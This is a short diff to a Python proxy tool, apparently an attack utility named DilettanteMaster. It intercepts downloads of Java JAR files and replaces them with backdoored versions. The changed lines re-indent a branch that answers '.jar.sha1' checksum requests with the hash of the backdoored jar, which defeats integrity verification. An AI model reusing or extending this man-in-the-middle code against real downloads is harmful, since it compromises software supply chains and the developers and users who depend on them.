@@ -156,10 +156,10 @@ class DilettanteMaster(flow.FlowMaster):
                     logging.info("done backdooring jar " + path)
                     f.response.content = backdoored_jar
             
-        elif re.match(".*\.jar.sha1$", path):
-            # return the hash of the backdoored jar
-            f.response.content =  self.jar_jar.get_hash(path)
-
+            elif re.match(".*\.jar.sha1$", path):
+            
+                # return the hash of the backdoored jar
+                f.response.content =  self.jar_jar.get_hash(path)
         r.reply()
 
         return f
